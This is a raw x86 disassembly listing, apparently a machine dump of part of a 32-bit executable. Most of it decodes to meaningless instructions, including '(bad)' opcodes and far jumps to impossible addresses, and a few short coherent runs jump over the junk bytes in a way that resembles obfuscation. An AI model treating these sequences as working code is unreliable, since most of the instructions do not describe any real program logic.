  40cf01:	add    DWORD PTR [esp+eax*2+0x35],edx
  40cf05:	das    
  40cf06:	jae    0x40cf42
  40cf08:	jge    0x40cef9
  40cf0a:	in     eax,dx
  40cf0b:	cmp    ebp,edi
  40cf0d:	mov    ebp,0x18a17b36
  40cf12:	fsqrt  
  40cf14:	ret    0x465e
  40cf17:	pop    edi
  40cf18:	xlat   BYTE PTR ds:[ebx]
  40cf19:	das    
  40cf1a:	out    dx,al
  40cf1b:	xchg   ebp,eax
  40cf1c:	imul   edx,DWORD PTR [ebp+0x348a1f01],0xbaa2cbc9
  40cf26:	fsub   QWORD PTR [esi-0x425da95a]
  40cf2c:	clc    
  40cf2d:	inc    esp
  40cf2e:	adc    DWORD PTR [ebp+eax*2-0x9],edi
  40cf32:	into   
  40cf33:	or     dl,BYTE PTR [ecx]
  40cf35:	jno    0x40cf8d
  40cf37:	dec    edx
  40cf38:	rcr    ebp,cl
  40cf3a:	lds    esp,FWORD PTR [ebx]
  40cf3c:	jbe    0x40cec4
  40cf3e:	je     0x40cf5a
  40cf40:	add    eax,0x53c70738
  40cf45:	je     0x40cf31
  40cf47:	xchg   esi,eax
  40cf48:	into   
  40cf49:	and    DWORD PTR [ecx-0x36eead6b],ebp
  40cf4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf50:	mov    dh,BYTE PTR [eax+0x3bde4913]
  40cf56:	stos   DWORD PTR es:[edi],eax
  40cf57:	dec    eax
  40cf58:	mov    BYTE PTR [edx],ch
  40cf5a:	ror    DWORD PTR [esi+0x4131f79d],0xeb
  40cf61:	xchg   edi,eax
  40cf62:	das    
  40cf63:	mov    ecx,0x69a380eb
  40cf68:	inc    eax
  40cf69:	mov    edi,0xa8126de5
  40cf6e:	inc    esp
  40cf6f:	jge    0x40cf57
  40cf71:	test   ch,bl
  40cf73:	scas   al,BYTE PTR es:[edi]
  40cf74:	dec    esp
  40cf75:	in     eax,dx
  40cf76:	(bad)  
  40cf78:	in     eax,0xc2
  40cf7a:	push   ecx
  40cf7b:	(bad)  [eax+0x76]
  40cf7e:	cwde   
  40cf7f:	jb     0x40cfea
  40cf81:	out    0x5,eax
  40cf83:	jmp    0x40cf76
  40cf85:	pop    edx
  40cf86:	iret   
  40cf87:	rcl    BYTE PTR [esi],0xc5
  40cf8a:	mov    ebp,0x71ec2a4
  40cf8f:	iret   
  40cf90:	(bad)  
  40cf91:	mov    ch,0xb
  40cf93:	push   ebp
  40cf94:	sahf   
  40cf95:	pop    ebx
  40cf96:	je     0x40cf44
  40cf98:	ret    
  40cf99:	mov    edx,0xd3022d11
  40cf9e:	and    DWORD PTR [eax+0x7a],ebx
  40cfa1:	je     0x40d01d
  40cfa3:	lods   eax,DWORD PTR ds:[si]
  40cfa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfa6:	inc    ecx
  40cfa7:	jnp    0x40cfa0
  40cfa9:	mov    esp,0xb388aee8
  40cfae:	pop    edi
  40cfaf:	push   esi
  40cfb0:	call   0xe2dd:0x531e2ff3
  40cfb7:	and    al,0x8
  40cfb9:	jo     0x40cf8b
  40cfbb:	loopne 0x40cfdb
  40cfbd:	test   al,0x48
  40cfbf:	or     DWORD PTR [ecx+ebx*4],ebx
  40cfc2:	aas    
  40cfc3:	jmp    0xfecc:0xd6bb727f
  40cfca:	int3   
  40cfcb:	mov    cl,0x80
  40cfcd:	cmp    eax,0x5c61a4a3
  40cfd2:	ds in  eax,dx
  40cfd4:	jns    0x40d009
  40cfd6:	or     DWORD PTR [ebp+0x45],0x46872a01
  40cfdd:	xchg   edx,eax
  40cfde:	jo     0x40cf89
  40cfe0:	les    esi,FWORD PTR [ecx+0x6b]
  40cfe3:	shr    DWORD PTR [ebx+0x16324c16],1
  40cfe9:	inc    ebx
  40cfea:	adc    ch,BYTE PTR [edx-0x7790116a]
  40cff0:	outs   dx,DWORD PTR ds:[esi]
  40cff1:	mov    bl,0x21
  40cff3:	ret    
  40cff4:	push   es
  40cff5:	mov    BYTE PTR [ebx],al
  40cff7:	xchg   esp,eax
  40cff8:	lods   al,BYTE PTR ds:[esi]
  40cff9:	inc    esp
  40cffa:	pop    esi
  40cffb:	adc    al,0xca
  40cffd:	lds    esp,FWORD PTR [ebx-0x6460cbda]
  40d003:	pusha  
  40d004:	ror    BYTE PTR [edx+0x75],1
  40d007:	dec    esi
  40d008:	fisttp WORD PTR [esi]
  40d00a:	sub    BYTE PTR [eax-0x2a],cl
  40d00d:	(bad)  
  40d00e:	lock jns 0x40cff9
  40d011:	int3   
  40d012:	arpl   WORD PTR [esi+0x22e955d8],dx
  40d018:	jle    0x40d084
  40d01a:	sbb    dh,BYTE PTR [ebx-0x7ba1bc5b]
  40d020:	aaa    
  40d021:	into   
  40d022:	xchg   edx,eax
  40d023:	pop    eax
  40d024:	adc    al,0x11
  40d026:	xor    al,0x63
  40d028:	mov    esi,0x9e6692d4
  40d02d:	sbb    eax,0x2ab27946
  40d032:	ja     0x40d082
  40d034:	call   0x1aae85ae
  40d039:	lds    eax,FWORD PTR [esi]
  40d03b:	les    ecx,FWORD PTR [ecx+ebx*4]
  40d03e:	push   ebp
  40d03f:	hlt    
  40d040:	sbb    BYTE PTR [ebx-0x72345ffe],al
  40d046:	dec    edi
  40d047:	jnp    0x40d08e
  40d049:	push   esi
  40d04a:	mov    WORD PTR [eax+0x15c0f8df],ds
  40d050:	mov    edi,0x31fb7ecd
  40d055:	push   es
  40d056:	std    
  40d057:	push   esp
  40d058:	dec    edi
  40d059:	xchg   edx,eax
  40d05a:	push   ss
  40d05b:	cs sbb al,0x27
  40d05e:	int3   
  40d05f:	scas   eax,DWORD PTR es:[edi]
  40d060:	inc    ecx
  40d061:	dec    esi
  40d062:	fsub   st(6),st
  40d064:	test   eax,0xa0d8c91
  40d069:	or     DWORD PTR [eax+0x59],ebp
  40d06c:	js     0x40d05d
  40d06e:	xor    eax,0x9ba06428
  40d073:	xchg   esi,eax
  40d074:	add    bh,BYTE PTR [esi+edx*2]
  40d077:	and    ch,BYTE PTR [eax-0x7fcab879]
  40d07d:	or     bl,dl
  40d07f:	jmp    0xa57492d9
  40d084:	xchg   ecx,eax
  40d085:	rol    DWORD PTR [esi+0x57],1
  40d088:	jae    0x40d06b
  40d08a:	mov    ebp,0xd0630d4f
  40d08f:	and    bh,al
  40d091:	sbb    DWORD PTR [ecx],eax
  40d093:	jmp    0x6592604
  40d098:	mov    ch,0xf8
  40d09a:	jecxz  0x40d092
  40d09c:	add    dh,BYTE PTR [ecx]
  40d09e:	mov    ebx,eax
  40d0a0:	mov    ah,0xf1
  40d0a2:	lods   al,BYTE PTR ds:[esi]
  40d0a3:	mov    dl,0x7e
  40d0a5:	mov    DWORD PTR [edi],edi
  40d0a7:	ds in  al,dx
  40d0a9:	repz add ebp,DWORD PTR [edx+ecx*1+0x5b]
  40d0ae:	mov    al,ds:0x972a7674
  40d0b3:	stos   BYTE PTR es:[edi],al
  40d0b4:	sbb    esi,DWORD PTR [edx+edx*2+0x9]
  40d0b8:	xchg   esi,eax
  40d0b9:	shl    BYTE PTR [esi-0x73],1
  40d0bc:	out    0xe9,eax
  40d0be:	stc    
  40d0bf:	stos   BYTE PTR es:[edi],al
  40d0c0:	in     eax,dx
  40d0c1:	leave  
  40d0c2:	in     eax,dx
  40d0c3:	jbe    0x40c12f
  40d0c9:	mov    edx,DWORD PTR [ebp-0xc]
  40d0cc:	mov    edi,DWORD PTR [ebp-0x24]
  40d0cf:	xor    edx,eax
  40d0d1:	add    edx,ecx
  40d0d3:	imul   edx,edi
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	les    esi,FWORD PTR [ebp+0x1b]
  40d0f0:	fwait
  40d0f1:	cmp    al,0xaa
  40d0f3:	popf   
  40d0f4:	jo     0x40d166
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d0c6
  40d0fb:	hlt    
  40d0fc:	lea    edx,[edi+0x4f1b9315]
  40d102:	inc    esp
  40d103:	adc    DWORD PTR [edx-0x42f885a0],edx
  40d109:	clc    
  40d10a:	adc    al,0x32
  40d10c:	sub    BYTE PTR [edi],bl
  40d10e:	mov    DWORD PTR [ecx],0x5e5664a4
  40d114:	js     0x40d0d2
  40d116:	dec    eax
  40d117:	pusha  
  40d118:	cwde   
  40d119:	aas    
  40d11a:	cmp    BYTE PTR [edi+ebp*1+0x7fc34770],ah
  40d121:	xor    ah,BYTE PTR [esi+0x36738ae4]
  40d127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d128:	test   BYTE PTR [esi],cl
  40d12a:	(bad)  
  40d12d:	pop    ebx
  40d12e:	adc    esp,DWORD PTR [eax-0x39]
  40d131:	stos   DWORD PTR es:[edi],eax
  40d132:	mov    eax,0x21df5654
  40d137:	cmp    eax,0x9d92d547
  40d13c:	hlt    
  40d13d:	lea    ebx,[edx+ebx*1-0x74c33981]
  40d144:	outs   dx,DWORD PTR ds:[esi]
  40d145:	mov    ah,0x9a
  40d147:	imul   eax,DWORD PTR [esi-0x11],0xffffffae
  40d14b:	sar    BYTE PTR [edi+eiz*1+0x4da7910c],1
  40d152:	shr    bl,cl
  40d154:	and    DWORD PTR [ebx],edx
  40d156:	dec    ebp
  40d157:	in     al,0xc8
  40d159:	pop    edi
  40d15a:	sub    eax,0x25d09181
  40d15f:	mov    ebp,0xb7bff8c7
  40d164:	push   cs
  40d165:	into   
  40d166:	push   ss
  40d167:	rcr    BYTE PTR ds:0x19ba6809,0x60
  40d16e:	jecxz  0x40d1b5
  40d170:	mov    dh,BYTE PTR [ebp+0x1]
  40d173:	int    0xbe
  40d175:	sbb    eax,DWORD PTR [esi-0x792c76ed]
  40d17b:	or     ebx,0x6f762429
  40d181:	ss enter 0x5f4c,0x6a
  40d186:	test   DWORD PTR [ebx-0x288cc319],eax
  40d18c:	imul   ebp,DWORD PTR [edx-0x4],0x4a
  40d190:	popa   
  40d191:	pop    esp
  40d192:	xor    al,0xa0
  40d194:	jle    0x40d13c
  40d196:	jns    0x40d11d
  40d198:	xchg   ebx,eax
  40d199:	pushf  
  40d19a:	call   0xf5d8fa0e
  40d19f:	das    
  40d1a0:	sti    
  40d1a1:	das    
  40d1a2:	mov    ebp,0x204ba9f5
  40d1a7:	aaa    
  40d1a8:	mov    ah,BYTE PTR [bx+di+0x3]
  40d1ac:	xor    al,0x41
  40d1ae:	jl     0x40d22f
  40d1b0:	sub    BYTE PTR [edi],al
  40d1b2:	not    al
  40d1b4:	rol    DWORD PTR [ebp+esi*2-0x6177e0f6],1
  40d1bb:	fs inc ecx
  40d1bd:	outs   dx,BYTE PTR ds:[esi]
  40d1be:	popf   
  40d1bf:	add    cl,BYTE PTR [ebp+0x1afb0bd]
  40d1c5:	nop
  40d1c6:	xor    DWORD PTR [edi],edx
  40d1c8:	rcr    DWORD PTR [esi],1
  40d1ca:	mov    gs:0x7edfb3fc,al
  40d1d0:	and    esp,ebp
  40d1d2:	aaa    
  40d1d3:	into   
  40d1d4:	rcl    DWORD PTR [edi],0x72
  40d1d7:	dec    eax
  40d1d8:	push   cs
  40d1d9:	popa   
  40d1da:	or     eax,DWORD PTR [esi-0x7b2546fc]
  40d1e0:	pop    eax
  40d1e1:	rol    DWORD PTR [eax-0x2c],0x28
  40d1e5:	fistp  WORD PTR [eax]
  40d1e7:	arpl   bp,cx
  40d1e9:	bound  edi,QWORD PTR [edi]
  40d1eb:	pop    ecx
  40d1ec:	nop
  40d1ed:	adc    eax,0xa2eaf6bb
  40d1f2:	fistp  QWORD PTR [edx]
  40d1f4:	mov    ch,0xdf
  40d1f6:	ficom  DWORD PTR [edi+0x4da22db8]
  40d1fc:	adc    al,0x6f
  40d1fe:	shr    DWORD PTR [ebx-0x6af1fd52],cl
  40d204:	shl    DWORD PTR [ebx],cl
  40d206:	adc    ebp,DWORD PTR [esi+0x7ac51aa]
  40d20c:	adc    eax,0x2501b2b6
  40d211:	cli    
  40d212:	int    0x6
  40d214:	inc    edi
  40d215:	sub    BYTE PTR [ecx+0xdba6da8],0xb4
  40d21c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d21d:	addr16 dec ebx
  40d21f:	dec    esp
  40d220:	jo     0x40d274
  40d222:	aad    0x71
  40d224:	repz call 0x5bff6ab1
  40d22a:	mov    dh,0x95
  40d22c:	iret   
  40d22d:	call   0x9aa8:0x7cde7ef1
  40d234:	inc    BYTE PTR [ecx+0x1916c600]
  40d23a:	inc    eax
  40d23b:	daa    
  40d23c:	push   edi
  40d23d:	fnstenv [ecx]
  40d23f:	ds in  eax,0x60
  40d242:	lds    ebp,FWORD PTR [eax+0x74]
  40d245:	pop    edi
  40d246:	jp     0x40d252
  40d248:	pop    ebp
  40d249:	adc    ah,BYTE PTR [esi+0x54c57aad]
  40d24f:	fisub  WORD PTR [esi-0x22]
  40d252:	push   eax
  40d253:	(bad)  
  40d254:	jl     0x40d2b9
  40d256:	adc    BYTE PTR [esi],ah
  40d258:	xchg   DWORD PTR cs:[ecx+0x3b],ebp
  40d25c:	pop    ds
  40d25d:	sbb    BYTE PTR [ecx+edi*4+0x9b5fc5c],bh
  40d264:	mov    cl,0xeb
  40d266:	pop    esp
  40d267:	shl    BYTE PTR [eax],cl
  40d269:	xor    eax,0x87519047
  40d26e:	fisttp WORD PTR [eax+0x5e348c4]
  40d274:	(bad)  
  40d275:	lods   eax,DWORD PTR ds:[esi]
  40d276:	retf   
  40d277:	sahf   
  40d278:	nop
  40d279:	jp     0x40d1ff
  40d27b:	enter  0xb8a6,0x24
  40d27f:	add    dh,cl
  40d281:	jle    0x40d2f0
  40d283:	out    0x72,eax
  40d285:	(bad)  
  40d286:	xchg   DWORD PTR gs:[edx-0x6a8db67a],esp
  40d28d:	jne    0x40d213
  40d28f:	push   0xffffffa3
  40d291:	mov    BYTE PTR [ebp+0x715e0a53],bl
  40d297:	push   gs
  40d299:	out    0xcf,al
  40d29b:	mov    DWORD PTR [ecx],edi
  40d29d:	xchg   ebp,eax
  40d29e:	std    
  40d29f:	(bad)  
  40d2a0:	(bad)  [eax]
  40d2a2:	cmp    DWORD PTR [edi],0x12
  40d2a5:	jns    0x40d2e2
  40d2a7:	push   eax
  40d2a8:	fnstenv [esi+0x6754d9c1]
  40d2ae:	out    0x57,al
  40d2b0:	sub    dl,BYTE PTR [edx]
  40d2b2:	push   ss
  40d2b3:	adc    al,0xf9
  40d2b5:	mov    eax,0x3774a799
  40d2ba:	icebp  
  40d2bb:	push   esi
  40d2bc:	retf   
  40d2bd:	push   ecx
  40d2be:	aas    
  40d2bf:	sbb    ecx,DWORD PTR [edx+0x38]
  40d2c2:	add    eax,ebx
  40d2c4:	and    bh,BYTE PTR [edx]
  40d2c6:	std    
  40d2c7:	pushf  
  40d2c8:	fistp  WORD PTR [ebp+0x0]
  40d2cb:	jbe    0x40d2b6
  40d2cd:	or     ebx,edx
  40d2cf:	cmp    dl,BYTE PTR [ebx]
  40d2d1:	lock shr BYTE PTR [ebp+0x3d],1
  40d2d5:	mov    dh,BYTE PTR [eax+0x7387fc89]
  40d2db:	sar    BYTE PTR [ecx],1
  40d2dd:	stos   DWORD PTR es:[edi],eax
  40d2de:	mov    bh,0xb4
  40d2e0:	cmp    bh,bh
  40d2e2:	repnz aas 
  40d2e4:	mov    al,0xdd
  40d2e6:	mov    edi,0x11464bb
  40d2eb:	pop    esp
  40d2ec:	push   edx
  40d2ed:	sub    BYTE PTR [eax-0x36657d43],cl
  40d2f3:	mov    dh,0xee
  40d2f5:	push   ss
  40d2f6:	pop    ecx
  40d2f7:	repnz out 0xda,al
  40d2fa:	(bad)  
  40d2fb:	add    BYTE PTR [ebx-0x18],dl
  40d2fe:	int3   
  40d2ff:	xchg   DWORD PTR [esi+edi*1-0x6db63526],ecx
  40d306:	das    
  40d307:	les    ebp,FWORD PTR [ebp+0x6d4c0bd1]
  40d30d:	pop    esi
  40d30e:	aaa    
  40d30f:	dec    esi
  40d310:	and    DWORD PTR [eax+0x29],0xd20d960f
  40d317:	leave  
  40d318:	pop    esi
  40d319:	xor    BYTE PTR [edi+esi*8],ch
  40d31c:	cmp    esp,DWORD PTR [ecx]
  40d31e:	(bad)  
  40d31f:	fldenv [eax]
  40d321:	gs ins BYTE PTR es:[edi],dx
  40d323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d324:	out    0x72,al
  40d326:	sar    DWORD PTR [ebp-0x1f],0x23
  40d32a:	cs adc al,0x9a
  40d32d:	or     bh,BYTE PTR [esi-0x9]
  40d330:	shl    DWORD PTR [edx-0x1b9ac8c9],1
  40d336:	call   0x9d2d5d1c
  40d33b:	and    DWORD PTR [eax+0x38],ebx
  40d33e:	test   eax,0x9d81a11e
  40d343:	adc    ah,BYTE PTR [esi+0x41]
  40d346:	gs dec edi
  40d348:	jmp    DWORD PTR [ebp+0x4f]
  40d34b:	pop    edi
  40d34c:	push   ecx
  40d34d:	xchg   ebx,eax
  40d34e:	scas   eax,DWORD PTR es:[edi]
  40d34f:	cli    
  40d350:	inc    ebx
  40d351:	in     al,0x7c
  40d353:	or     al,0x64
  40d355:	push   0x9d1d407f
  40d35a:	rol    BYTE PTR ds:0x76d68aa7,1
  40d360:	nop
  40d361:	scas   al,BYTE PTR es:[edi]
  40d362:	mov    dl,0xc4
  40d364:	lods   al,BYTE PTR ds:[esi]
  40d365:	jle    0x40d32f
  40d367:	jo     0x40d3e8
  40d369:	mov    eax,0xaa7fc000
  40d36e:	mov    al,ds:0x52f72c16
  40d373:	adc    ecx,DWORD PTR [edi]
  40d375:	shl    BYTE PTR [eax+edi*8+0x23d19864],cl
  40d37c:	scas   eax,DWORD PTR es:[edi]
  40d37d:	ficomp WORD PTR [ecx-0x8]
  40d380:	ins    BYTE PTR es:[edi],dx
  40d381:	ins    DWORD PTR es:[edi],dx
  40d382:	leave  
  40d383:	ins    DWORD PTR es:[edi],dx
  40d384:	jge    0x40d402
  40d386:	mov    BYTE PTR [ebx+edx*2+0x7b6975c5],al
  40d38d:	or     bl,bl
  40d38f:	xor    ebp,DWORD PTR [ebx+0x58]
  40d392:	mov    dl,0x51
  40d394:	enter  0x812f,0x9
  40d398:	cld    
  40d399:	repnz sub esi,DWORD PTR [eax+ecx*1+0x73267351]
  40d3a1:	mov    edi,0x3fe7e71f
  40d3a6:	dec    esp
  40d3a7:	fild   WORD PTR [eax+0x2e]
  40d3aa:	daa    
  40d3ab:	jle    0x40d34a
  40d3ad:	pop    ss
  40d3ae:	clc    
  40d3af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3b0:	cmp    al,0x30
  40d3b2:	dec    ebx
  40d3b3:	popa   
  40d3b4:	jo     0x40d3b4
  40d3b6:	mov    ebp,0xb5f77016
  40d3bb:	aam    0xc5
  40d3bd:	jmp    0x40d3ad
  40d3bf:	sub    DWORD PTR [esi+0x50],esi
  40d3c2:	adc    ebp,ebx
  40d3c4:	js     0x40d396
  40d3c6:	dec    esp
  40d3c7:	xor    eax,0x9a4dcc75
  40d3cc:	xor    al,0x37
  40d3ce:	fld    QWORD PTR [edi+0x7a100113]
  40d3d4:	and    eax,0x8240c620
  40d3d9:	(bad)  
  40d3da:	ins    DWORD PTR es:[edi],dx
  40d3db:	stos   DWORD PTR es:[edi],eax
  40d3dc:	cmp    bl,0x57
  40d3df:	and    al,0x73
  40d3e1:	push   cs
  40d3e2:	dec    esi
  40d3e3:	retf   0x4865
  40d3e6:	fiadd  WORD PTR [edx+esi*8-0x62958424]
  40d3ed:	push   ebp
  40d3ee:	pop    es
  40d3ef:	in     eax,0xee
  40d3f1:	xchg   edi,eax
  40d3f2:	cld    
  40d3f3:	inc    ecx
  40d3f4:	push   esp
  40d3f5:	or     al,0x61
  40d3f7:	mov    esi,0xd89f44fb
  40d3fc:	(bad)  
  40d3fd:	fst    QWORD PTR [ebp+ecx*2+0x2d]
  40d401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d402:	sti    
  40d403:	fisttp WORD PTR [ebx-0x8f62f41]
  40d409:	dec    edi
  40d40a:	fmul   st(7),st
  40d40c:	inc    ebx
  40d40d:	inc    ebx
  40d40e:	test   al,0xe1
  40d410:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d411:	and    esp,DWORD PTR [ebx]
  40d413:	push   edx
  40d414:	xlat   BYTE PTR ds:[ebx]
  40d415:	in     al,0x7
  40d417:	and    eax,0x524fa88e
  40d41c:	push   ebp
  40d41d:	sahf   
  40d41e:	inc    esp
  40d41f:	jecxz  0x40d3a3
  40d421:	ret    
  40d422:	mov    edx,0xf6ed17ce
  40d427:	or     BYTE PTR [edx+0x25],0xf9
  40d42b:	mov    al,0x49
  40d42d:	lds    ecx,FWORD PTR ds:0xbeb61882
  40d433:	add    ah,BYTE PTR [ecx+0x38ce33e7]
  40d439:	inc    esi
  40d43a:	das    
  40d43b:	bnd jp 0x40d406
  40d43e:	mov    ch,0x6a
  40d440:	push   esi
  40d441:	cmp    al,0xa9
  40d443:	sub    al,0x85
  40d445:	sbb    eax,ebp
  40d447:	bound  eax,QWORD PTR ds:0xef5b2e04
  40d44d:	scas   al,BYTE PTR es:[edi]
  40d44e:	xlat   BYTE PTR fs:[ebx]
  40d450:	sahf   
  40d451:	jne    0x40d3f0
  40d453:	lods   al,BYTE PTR ds:[esi]
  40d454:	dec    ebp
  40d455:	pop    ecx
  40d456:	mov    ebx,0x466d885
  40d45b:	bound  esi,QWORD PTR [esi]
  40d45d:	fs jbe 0x40d3f2
  40d460:	mov    esi,0xae51cabf
  40d465:	repnz ds pop esi
  40d468:	push   edx
  40d469:	inc    ebp
  40d46a:	test   eax,0xeafa0a0d
  40d46f:	fs xor eax,0xfe5db4ac
  40d475:	ins    DWORD PTR es:[edi],dx
  40d476:	popf   
  40d477:	test   DWORD PTR [edx+0x4144f604],esi
  40d47d:	pop    esp
  40d47e:	push   edx
  40d47f:	test   eax,0xe2e4103f
  40d484:	add    al,0x12
  40d486:	push   esi
  40d487:	call   0x1902c8fd
  40d48c:	popf   
  40d48d:	xchg   ecx,eax
  40d48e:	(bad)  
  40d48f:	outs   dx,BYTE PTR ds:[esi]
  40d490:	mov    edx,0x918bb910
  40d495:	inc    ebp
  40d496:	jmp    0x40d43b
  40d498:	in     al,0x7d
  40d49a:	out    0x8b,eax
  40d49c:	jge    0x40d496
  40d49e:	lea    edx,[edx+edi*1+0x32729c]
  40d4a5:	mov    DWORD PTR [ebp-0x8],edx
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0xe7d3:0xb81a1d63
  40d4c6:	je     0x40d4dc
  40d4c8:	mov    bl,0xc9
  40d4ca:	cdq    
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d47e
  40d4d2:	sbb    al,0xad
  40d4d4:	rol    dh,0xce
  40d4d7:	jno    0x40d4b2
  40d4d9:	xor    ebp,edx
  40d4db:	int3   
  40d4dc:	mov    ebx,0xae3d8cc5
  40d4e1:	mov    esp,DWORD PTR [edx]
  40d4e3:	scas   eax,DWORD PTR es:[edi]
  40d4e4:	add    bl,BYTE PTR [ebx]
  40d4e6:	push   esp
  40d4e7:	or     esi,DWORD PTR [ecx+0x2b]
  40d4ea:	ret    0xe942
  40d4ed:	inc    eax
  40d4ee:	into   
  40d4ef:	rcr    DWORD PTR ds:0x473252be,cl
  40d4f5:	lods   al,BYTE PTR ds:[esi]
  40d4f6:	mov    eax,0xc7043c50
  40d4fb:	xchg   edi,eax
  40d4fc:	inc    ebx
  40d4fd:	add    ah,BYTE PTR [eax+0x3a]
  40d500:	pop    ebp
  40d501:	pusha  
  40d502:	jecxz  0x40d4c2
  40d504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d505:	push   ebp
  40d506:	jbe    0x40d4aa
  40d508:	fidiv  WORD PTR [ebp+0x61]
  40d50b:	sbb    eax,0x56651a53
  40d510:	(bad)  
  40d512:	pop    ds
  40d513:	adc    ch,ch
  40d515:	jmp    0x7224:0x3788caff
  40d51c:	mov    edx,0x4160144a
  40d521:	aas    
  40d522:	arpl   WORD PTR [eax-0x79],cx
  40d525:	mov    BYTE PTR [eax+eax*2-0x1d],ah
  40d529:	call   0xb860:0x28cc61e8
  40d530:	mov    ebx,0x12db7113
  40d535:	bnd ja 0x40d4bd
  40d538:	ss addr16 mov bh,0xaf
  40d53c:	mov    dh,0xf1
  40d53e:	mov    esp,DWORD PTR [edi+0x24]
  40d541:	fadd   QWORD PTR [edx-0x1e549491]
  40d547:	mov    ecx,0x70d0fbb0
  40d54c:	(bad)  
  40d54d:	sub    edx,edx
  40d54f:	icebp  
  40d550:	xchg   BYTE PTR [ebp+eax*2-0x4e],bl
  40d554:	ja     0x40d535
  40d556:	dec    esp
  40d557:	fisubr WORD PTR [eax+edi*8-0x28817ce6]
  40d55e:	xchg   ebp,eax
  40d55f:	or     edi,0x690d8ee9
  40d565:	mov    eax,DWORD PTR [edx+0x79]
  40d568:	dec    edi
  40d569:	dec    edx
  40d56a:	xor    eax,0xc7ecaca4
  40d56f:	mov    esp,0x468416ea
  40d574:	or     al,0xf2
  40d576:	pop    ecx
  40d577:	sub    DWORD PTR [edx+0x22],esi
  40d57a:	fwait
  40d57b:	inc    ebx
  40d57d:	xchg   ecx,eax
  40d57e:	inc    ecx
  40d57f:	retf   0xef82
  40d582:	dec    ecx
  40d583:	xor    al,BYTE PTR [edx+0xea343bb]
  40d589:	add    edi,esi
  40d58b:	loope  0x40d511
  40d58d:	adc    al,0x11
  40d58f:	invd   
  40d591:	sbb    BYTE PTR [ebp+0x197adf5e],ah
  40d597:	icebp  
  40d598:	cwde   
  40d599:	adc    bh,BYTE PTR [eax]
  40d59b:	xchg   BYTE PTR [ebx-0x4adcce37],dl
  40d5a1:	pusha  
  40d5a2:	push   es
  40d5a3:	pusha  
  40d5a4:	sub    eax,0x57faf7f
  40d5a9:	jge    0x40d53a
  40d5ab:	and    ecx,DWORD PTR [edi-0x61]
  40d5ae:	xchg   esi,eax
  40d5af:	inc    eax
  40d5b0:	in     al,dx
  40d5b1:	outs   dx,BYTE PTR ds:[esi]
  40d5b2:	mov    eax,0x79a8576d
  40d5b7:	outs   dx,BYTE PTR ds:[esi]
  40d5b8:	aas    
  40d5b9:	cs push esi
  40d5bb:	fcmovnb st,st(7)
  40d5bd:	gs sub ah,bh
  40d5c0:	mov    eax,0xc0f96d1d
  40d5c5:	cmp    DWORD PTR [ebp+edx*2-0x43dba67e],esi
  40d5cc:	stc    
  40d5cd:	scas   al,BYTE PTR es:[edi]
  40d5ce:	push   ebp
  40d5cf:	mov    dl,0x25
  40d5d1:	push   ebx
  40d5d2:	and    DWORD PTR [esi+0x47e81cb4],ebx
  40d5d8:	jb     0x40d616
  40d5da:	jo     0x40d56d
  40d5dc:	jns    0x40d5ee
  40d5de:	retf   0x420f
  40d5e1:	retf   
  40d5e2:	mov    eax,0x22265867
  40d5e7:	mov    eax,ds:0x576f6fb3
  40d5ec:	or     BYTE PTR [ecx-0x6],bh
  40d5ef:	push   0x28
  40d5f1:	mov    esp,0xb325918b
  40d5f6:	jbe    0x40d636
  40d5f8:	xchg   esp,eax
  40d5f9:	in     eax,0x6
  40d5fb:	sbb    esp,DWORD PTR [edx-0x1d]
  40d5fe:	mov    ch,0xa3
  40d600:	mov    edi,DWORD PTR [esi-0xe]
  40d603:	stos   BYTE PTR es:[edi],al
  40d604:	fs test DWORD PTR ss:[edx+0x28],ebp
  40d609:	daa    
  40d60a:	mov    esi,ss
  40d60c:	mov    eax,?
  40d60e:	cmp    ecx,ecx
  40d610:	cld    
  40d611:	cli    
  40d612:	xlat   BYTE PTR ds:[ebx]
  40d613:	mov    al,0xbb
  40d615:	fstp   TBYTE PTR [ebp+0x6]
  40d618:	xchg   ebx,eax
  40d619:	in     al,0x50
  40d61b:	and    ch,dl
  40d61d:	leave  
  40d61e:	push   es
  40d61f:	xor    al,0x60
  40d621:	out    0x6c,al
  40d623:	(bad)
  40d626:	fcmovb st,st(5)
  40d628:	pop    es
  40d629:	adc    cl,BYTE PTR [esi+0x35ad9138]
  40d62f:	mov    ebx,0x311fc5d8
  40d634:	(bad)  
  40d635:	push   ds
  40d636:	mov    esp,0x6936d0ac
  40d63b:	cmc    
  40d63c:	jns    0x40d684
  40d63e:	es cli 
  40d640:	cmp    DWORD PTR [edi-0x12],eax
  40d643:	mov    dh,0x24
  40d645:	push   0xd
  40d647:	(bad)  [edi+0x45]
  40d64a:	xor    BYTE PTR [eax-0x76],0xf3
  40d64e:	call   0x8100:0x36df6d03
  40d655:	push   ebp
  40d656:	cmp    eax,DWORD PTR [eax-0x9]
  40d659:	stos   DWORD PTR es:[edi],eax
  40d65a:	sti    
  40d65b:	fs aam 0x87
  40d65e:	into   
  40d65f:	hlt    
  40d660:	hlt    
  40d661:	and    ah,BYTE PTR [eax-0x1a]
  40d664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
